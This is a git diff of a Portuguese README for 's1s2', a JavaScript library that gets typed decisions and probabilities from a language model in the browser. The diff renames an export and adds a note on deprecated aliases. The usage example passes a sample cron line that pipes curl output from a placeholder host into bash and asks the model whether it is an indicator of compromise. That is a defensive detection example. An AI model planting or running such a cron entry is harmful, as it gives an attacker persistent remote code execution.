@@ -5,17 +5,17 @@
 Decisões tipadas numa só passada de um modelo de linguagem, no navegador, com a probabilidade e a margem de cada resposta. Quando você quer uma explicação, o mesmo modelo gera texto com os mesmos pesos.
 
 ```js
-import { S12 } from "s1s2";
+import { S1S2 } from "s1s2";
 
-const kk = await S12.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // escolhe o runtime do aparelho
-const s = await kk.decide({
+const model = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // escolhe o runtime do aparelho
+const s = await model.decide({
   input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
   questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
   // evidence: { requirement: "..." },  // pacotes com head de evidência: s.evidence = a frase que mostra
 });
 const { probability, margin } = s.answers[0];                // P(verdadeiro) e p(1º) - p(2º)
 const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 96 });  // mesmos pesos
-await s.dispose(); await kk.dispose();
+await s.dispose(); await model.dispose();
 ```
 
 ## O que é
@@ -26,6 +26,7 @@ await s.dispose(); await kk.dispose();
 - Runtimes: ONNX Runtime Web (grafos GenAI e decoders comuns), transformers.js, WebLLM e LiteRT.js. No Node, onnxruntime-node.
 - Lê **pacotes S1S2**: um manifesto que fixa cada arquivo por sha256 e descreve o layout do prompt, os marcadores, as leituras e os heads. A biblioteca e o formato têm o mesmo nome; o formato está especificado em [`spec/`](spec/s1s2-package.md).
 - Formatos de head que lê: Kev `head.pt`, heads de decisão em GGUF, alias3-web `head.bin`, leituras lineares d3/pplx, JEV, `DecisionConfig` do transformers e heads conjuntos Clef. [`converters/heads/`](converters/heads) converte cada um deles e grava um registro de fidelidade contra o código de referência do próprio formato.
+- Antes se chamava s12: o export `S12` e manifests com `schema: "s12.manifest/1"` continuam funcionando, como aliases obsoletos de `S1S2` e `"s1s2.manifest/1"`.
 
 ## Estado: alfa
 
